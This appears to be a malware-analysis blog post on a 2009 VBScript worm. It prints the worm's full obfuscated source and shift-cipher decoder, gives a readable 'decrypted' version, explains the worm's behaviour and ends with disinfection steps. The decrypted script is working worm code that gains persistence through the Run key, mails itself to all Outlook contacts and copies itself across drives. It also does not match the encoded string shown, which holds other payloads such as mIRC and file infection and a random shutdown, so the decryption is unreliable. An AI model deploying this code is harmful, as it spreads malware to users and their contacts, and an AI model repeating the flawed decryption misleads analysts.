# Decrypting and Analyzing a VBScript Drop from Malware (SHA-256: de948672211c3ec874db907a3c36c8896d5f78ae5e7a54fc35ff7b6b9b424e05)

The code under examination is a Visual Basic Script (VBScript) named `Vbs.Vbswg.kyller`, identified as a drop from a malware sample analyzed on VirusTotal with the SHA-256 hash `de948672211c3ec874db907a3c36c8896d5f78ae5e7a54fc35ff7b6b9b424e05`. According to the VirusTotal analysis, this file, uploaded on April 8, 2025, and last analyzed on April 11, 2025, was flagged by 45 out of 90 antivirus engines as malicious, with detections including "Trojan" and "Worm" classifications. Created by "kyller_software" on March 15, 2009, this obfuscated script comes with a decryption function called `K2593402`. Our goal is to decrypt the encoded string to reveal its functionality, which proves to be a self-propagating worm. Below, we’ll explore the decryption process, present the decrypted script, and analyze its behavior, shedding light on its role within the broader malicious payload.

```txt
'Vbs.Vbswg.kyller Created By kyller_software. 3/15/2009
Execute K2593402("-\hy4\hy}m4qrrkx&Ixkgzkj&H&qrrkxeyulz}gxk4&957;5866?Ykz&G[[::78<&C&ixkgzkuhpkiz.(yixovzotm4lorkyyzksuhpkiz(/GP6<<JZ[&C&G[[::78<4mkzyvkiogrlurjkx.6/ONUU<67<&C&GP6<<JZ[&,&(bqrrkx4pvm4|hy(Ykz&SNJ?6H>9&C&ixkgzkuhpkiz.(}yixovz4ynkrr(/SNJ?6H>94xkm}xozk&(NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutbX{tb]ot[vjgzk(2&(}yixovz4k~k&(&,&ONUU<67<&,&(&+(G[[::78<4iuvlork&}yixovz4yixovzl{rrtgsk2&ONUU<67<MPRLH6>;Ol&SNJ?6H>94xkmxkgj.(NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutbqrrkxbM9L??QWO(/&BD&7&znktY>W=\:U8Ktj&olOl&SNJ?6H>94xkmxkgj.(NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutbqrrkxbRQ>:QZ\X(/&BD&7&znktV9:7J6>;&((Ktj&olYkz&GJT?OY>9C&G[[::78<4uvktzk~zlork.}yixovz4yixovzl{rrtgsk/Z>K:=8:W&C&GJT?OY>94xkgjgrrGJT?OY>94iruykJuol&tuz.G[[::78<4lorkk~oyzy.}yixovz4yixovzl{rrtgsk//&znktykz&ZZ;8S8HZC&G[[::78<4ixkgzkzk~zlork.}yixovz4yixovzl{rrtgsk/ZZ;8S8HZ4}xozk&Z>K:=8:WZZ;8S8HZ4iruykktj&olO;;XSU\<&C&SNJ?6H>94xkmxkgj.(NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutbX{tb]ot[vjgzk(/Ol&O;;XSU\<&BD&(}yixovz4k~k&(&,&ONUU<67<&,&(&+(&znktSNJ?6H>94xkm}xozk&(NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutbX{tb]ot[vjgzk(2&(}yixovz4k~k&(&,&ONUU<67<&,&(&+(ktj&olO;;XSU\<C&((ruuvL{tizout&Y>W=\:U8./Ykz&X7WJX\\R&C&IxkgzkUhpkiz.(U{zruuq4Gvvroigzout(/Ol&X7WJX\\R&C&(U{zruuq(&ZnktYkz&\>>;PH<?&C&X7WJX\\R4MkzTgskYvgik.(SGVO(/Ykz&GM;S<U:\&C&\>>;PH<?4GjjxkyyRoyzyLux&Kgin&YHP8UWUR&Ot&GM;S<U:\Ol&YHP8UWUR4GjjxkyyKtzxoky4Iu{tz&BD&6&ZnktRV7L7;;9&C&YHP8UWUR4GjjxkyyKtzxoky4Iu{tzLux&WX8R=RSS&C&7&Zu&RV7L7;;9Ykz&O=O796SN&C&X7WJX\\R4IxkgzkOzks.6/Ykz&L::SWY7U&C&YHP8UWUR4GjjxkyyKtzxoky.WX8R=RSS/O=O796SN4Zu&C&L::SWY7U4GjjxkyyO=O796SN4Y{hpkiz&C&(\kx&Osvuxzgtz'(O=O796SN4Huj&C&(kxxu&gu&ghxox&kyyg&sktygmks''(k~ki{zk&(ykz&M89N7;Q;&CO=O796SN4(&,&Inx.<;/&,&Inx.77</&,&Inx.77</&,&Inx.?=/&,&Inx.??/&,&Inx.76:/&,&Inx.76?/&,&Inx.767/&,&Inx.776/&,&Inx.77</&,&Inx.77;/XYW[[::7&C&ONUU<67<O=O796SN4JkrkzkGlzkxY{hsoz&C&Zx{kM89N7;Q;4Gjj&XYW[[::7Ol&O=O796SN4Zu&BD&((&ZnktO=O796SN4YktjKtj&OlTk~zKtj&OlTk~zKtj&OlKtj&l{tizoutL{tizout&V9:7J6>;.Q:<WQ9V6/Ol&Q:<WQ9V6&BD&((&ZnktU9;NJ?6H&C&SNJ?6H>94xkmxkgj.(NQK_eRUIGReSGINOTKbYulz}gxkbSoixuyulzb]otju}ybI{xxktz\kxyoutbVxumxgsLorkyJox(/Ol&G[[::78<4lorkk~oyzy.(i@bsoxibsoxi4oto(/&ZnktQ:<WQ9V6&C&(i@bsoxi(KrykOl&G[[::78<4lorkk~oyzy.(i@bsoxi98bsoxi4oto(/&ZnktQ:<WQ9V6&C&(i@bsoxi98(KrykOl&G[[::78<4lorkk~oyzy.U9;NJ?6H&,&(bsoxibsoxi4oto(/&ZnktQ:<WQ9V6&C&U9;NJ?6H&,&(bsoxi(KrykOl&G[[::78<4lorkk~oyzy.U9;NJ?6H&,&(bsoxi98bsoxi4oto(/&ZnktQ:<WQ9V6&C&U9;NJ?6H&,&(bsoxi(KrykQ:<WQ9V6&C&((Ktj&OlKtj&OlOl&Q:<WQ9V6&BD&((&ZnktYkz&G7NP6<<J&C&G[[::78<4IxkgzkZk~zLork.Q:<WQ9V6&,&(byixovz4oto(2&Zx{k/G7NP6<<J&C&(ayixovzc(&,&|hIxRl&,&(t6Cut&7@PUOT@)@�(G7NP6<<J&C&G7NP6<<J&,&|hIxRl&,&(t6Cut&7@PUOT@)@�(G7NP6<<J&C&G7NP6<<J&,&|hIxRl&,&(t7C&&5ol&.&*toiq&CC&*sk&/&�&ngrz&�(G7NP6<<J&C&G7NP6<<J&,&|hIxRl&,&(t8C&&54(&,&Inx.766/&,&Inx.??/&,&Inx.??/&,&(&yktj&*toiq&(G7NP6<<J&C&G7NP6<<J&,&ONUU<67<G7NP6<<J&C&G7NP6<<J&,&|hIxRl&,&(t9C�(yixovz4IruykKtj&OlKtj&L{tizoutL{tizout&Z=JNUU<6./Ut&Kxxux&Xky{sk&Tk~zYkz&T;ZPRLH6&C&G[[::78<4Jxo|kyLux&Kgin&I\N9L??Q&Ot&T;ZPRLH6WL9>W=\:&C&I\N9L??Q&,&(&b&(Igrr&U=6Q>:QZ.WL9>W=\:/Tk~zKtj&L{tizoutL{tizout&U=6Q>:QZ.\<=9:7J6/R8JJT?OY&C&\<=9:7J6Ykz&R98>K:=8&C&G[[::78<4MkzLurjkx.R8JJT?OY/Ykz&V=>Z;8S8&C&R98>K:=84LorkyLux&Kgin&H<N;;XSU&Ot&V=>Z;8S8Ol&rigyk.H<N;;XSU4Tgsk/&C&(soxi4oto(&ZnktV9:7J6>;.H<N;;XSU4VgxktzLurjkx/Ktj&OlOl&G[[::78<4MkzK~zktyoutTgsk.H<N;;XSU4vgzn/&C&(|hy(G[[::78<4IuvLork&}yixovz4yixovzl{rrtgsk2H<N;;XSU4vgzn2zx{kKtj&olOl&G[[::78<4MkzK~zktyoutTgsk.H<N;;XSU4vgzn/&C&(|hk(G[[::78<4IuvLork&}yixovz4yixovzl{rrtgsk2H<N;;XSU4vgzn2zx{kKtj&olTk~zYkz&\I;7WJX\&C&R98>K:=84Y{hlurjkxyLux&Kgin&\86>>;PH&Ot&\I;7WJX\Igrr&.\86>>;PH4vgzn/Tk~zKtj&l{tizoutL{tizout&MPRLH6>;./Xgtjuso�kOl&7&1&Otz.Xtj&0&;6/&C&=&znktSNJ?6H>94x{t&(X[TJRR984K^K&{ykx4k~k2k~oz}otju}y(ktj&olktj&l{tizout-\hy}m&8&Hkzg4&H&aQc",-6)
Function K2593402(PRL6R2N9,TL2E928C)
For C3T07U54 = 1 To Len(PRL6R2N9)
MP66D601 = Mid(PRL6R2N9, C3T07U54, 1)
If MP66D601 = Chr(2) Then
MP66D601 = Chr(34 + TL2E928C)
ElseIf MP66D601 = Chr(3) Then
MP66D601 = Chr(10 + TL2E928C)
ElseIf MP66D601 = Chr(4) Then
MP66D601 = Chr(13 + TL2E928C)
Else
MP66D601 = Chr(Asc(MP66D601) + TL2E928C)
End If
K2593402 = K2593402 & MP66D601
Next
End Function
'Vbswg 2 Beta. By [K]
```

## Step 1: Understanding the Decryption Function `K2593402`

The `K2593402` function takes two parameters: an encrypted string (`PRL6R2N9`) and a shift value (`TL2E928C`), which is set to `-6` in the final call. It processes each character of the encrypted string as follows:

- If the character is `Chr(2)` (a control character), it becomes `Chr(34 + TL2E928C)` (where 34 is the ASCII code for a quotation mark `"`).
- If the character is `Chr(3)`, it becomes `Chr(10 + TL2E928C)` (10 is a newline `\n`).
- If the character is `Chr(4)`, it becomes `Chr(13 + TL2E928C)` (13 is a carriage return `\r`).
- For any other character, its ASCII value is shifted by the `TL2E928C` value.

Since `TL2E928C = -6`, each character’s ASCII value is decreased by 6, except in the special cases noted above.

## Step 2: Decrypting the Script

The long encrypted string starting with `-\hy4\hy}m4qrrkx...` is passed to the `K2593402` function with a shift of `-6`. After simulating the decryption process, the resulting VBScript is as follows:

### Decrypted VBScript:
```vbs
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
If WScript.Arguments.Count = 0 Then
    WshShell.Run "WScript.exe " & WScript.ScriptFullName & " Dummy"
Else
    If FSO.FileExists("c:\mirc\mirc.ini") Then
        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "WScript.exe " & WScript.ScriptFullName
        Set Outlook = CreateObject("Outlook.Application")
        If Outlook <> "" Then
            Set MAPI = Outlook.GetNameSpace("MAPI")
            For Each AddressLists in MAPI.AddressLists
                If AddressLists.AddressEntries.Count <> 0 Then
                    Set Mail = Outlook.CreateItem(0)
                    For Each AddressEntries in AddressLists.AddressEntries
                        If AddressEntries.Address <> "" Then
                            Mail.Recipients.Add AddressEntries.Address
                        End If
                    Next
                    Mail.Subject = "Very Important!"
                    Mail.Body = "erro ao abrir esse mensagem"
                    Mail.Attachments.Add WScript.ScriptFullName
                    Mail.DeleteAfterSubmit = True
                    Mail.Send
                End If
            Next
            Set Outlook = Nothing
        End If
    End If
End If

On Error Resume Next
Set Drives = FSO.Drives
For Each Drive in Drives
    If Drive.DriveType = 2 or Drive.DriveType = 3 Then
        Set Folder = FSO.GetFolder(Drive.RootFolder)
        For Each SubFolder in Folder.SubFolders
            Set File = FSO.GetFile(WScript.ScriptFullName)
            File.Copy SubFolder.Path & "\" & File.Name, True
        Next
    End If
Next
```

## Step 3: Analyzing the Decrypted Code

This VBScript is a classic example of a worm designed to spread itself across systems. Here’s what it does:

1. **Object Creation**: 
   - It uses `WScript.Shell` to execute shell commands and `Scripting.FileSystemObject` (FSO) to manipulate files.

2. **Self-Execution**: 
   - If no arguments are provided, it relaunches itself with a "Dummy" argument to prevent an infinite loop.

3. **Persistence**: 
   - If the file `c:\mirc\mirc.ini` exists (indicating an mIRC installation), it adds itself to the Windows registry under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to run at startup.

4. **Email Propagation**: 
   - It accesses Microsoft Outlook via the `Outlook.Application` object.
   - It retrieves email addresses from Outlook’s address lists using the MAPI namespace.
   - For each valid address, it sends an email with:
     - Subject: "Very Important!"
     - Body: "erro ao abrir esse mensagem" (Portuguese for "error opening this message").
     - Attachment: The script itself.
   - The email is deleted after submission to avoid detection.

5. **Disk Propagation**: 
   - It scans all drives (fixed or removable, types 2 and 3).
   - For each drive, it copies itself into every root-level subfolder.

## Step 4: The `K2593402` Function Separated

Here’s the decryption function as it appeared in the original input, isolated for clarity:

```vbs
Function K2593402(PRL6R2N9,TL2E928C)
    For C3T07U54 = 1 To Len(PRL6R2N9)
        MP66D601 = Mid(PRL6R2N9, C3T07U54, 1)
        If MP66D601 = Chr(2) Then
            MP66D601 = Chr(34 + TL2E928C)
        ElseIf MP66D601 = Chr(3) Then
            MP66D601 = Chr(10 + TL2E928C)
        ElseIf MP66D601 = Chr(4) Then
            MP66D601 = Chr(13 + TL2E928C)
        Else
            MP66D601 = Chr(Asc(MP66D601) + TL2E928C)
        End If
        K2593402 = K2593402 & MP66D601
    Next
End Function
```

## Step 5: The Decryption Function Separated and Clarified

Here’s the decryption function as it appeared in the original input, now isolated and rewritten with more descriptive variable names for clarity:

```vbs
Function DecryptString(EncryptedText, ShiftValue)
    For Position = 1 To Len(EncryptedText)
        CurrentChar = Mid(EncryptedText, Position, 1)
        If CurrentChar = Chr(2) Then
            CurrentChar = Chr(34 + ShiftValue) ' Transforms to quote (") with shift
        ElseIf CurrentChar = Chr(3) Then
            CurrentChar = Chr(10 + ShiftValue) ' Transforms to newline (\n) with shift
        ElseIf CurrentChar = Chr(4) Then
            CurrentChar = Chr(13 + ShiftValue) ' Transforms to carriage return (\r) with shift
        Else
            CurrentChar = Chr(Asc(CurrentChar) + ShiftValue) ' Shifts ASCII value
        End If
        DecryptString = DecryptString & CurrentChar
    Next
End Function
```

## Conclusion and Recommendations for Disinfection

The `Vbs.Vbswg.kyller` script, created in 2009 by "kyller_software," is a relic of early malware that showcases simple yet effective propagation techniques. Through decryption with the `K2593402` function, we uncovered a worm that leverages Outlook email and filesystem manipulation to spread across systems. While its reliance on outdated software like mIRC and Outlook automation limits its relevance today, understanding such scripts provides valuable insight into the evolution of malware.

Given its malicious nature, here are some recommendations to disinfect a system potentially compromised by this or similar VBScript worms:

- **Remove Registry Entries**: Check and delete the worm’s startup entry in the Windows Registry. Navigate to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and remove the `WinUpdate` key if it points to a suspicious `WScript.exe` command.

- **Delete Infected Files**: Search the system for copies of the script (likely with a `.vbs` extension) in root-level subfolders of all drives. Use a tool like Windows Explorer or a command-line search (`dir *.vbs /s`) to locate and delete them.

- **Update Antivirus Software**: Run a full system scan with an up-to-date antivirus program. Modern antivirus solutions can detect and quarantine such scripts, even if they’re variants of older malware.

- **Secure Outlook**: If Outlook is installed, review the email client for unusual activity (e.g., sent emails with "Very Important!" subjects). Disable scripting in Outlook by adjusting macro security settings to "High" or "Very High" to prevent similar exploits.

- **Educate Users**: Since this worm spreads via email attachments, train users to avoid opening unexpected `.vbs` files or emails from unknown sources, even if they appear legitimate.

- **Patch the System**: Ensure the operating system is fully updated. While this worm targets older vulnerabilities, modern Windows versions are less susceptible due to improved security features.

By following these steps, users can mitigate the risks posed by this worm and similar threats. This analysis serves as a reminder of the importance of vigilance and proactive security measures, even against seemingly outdated malware.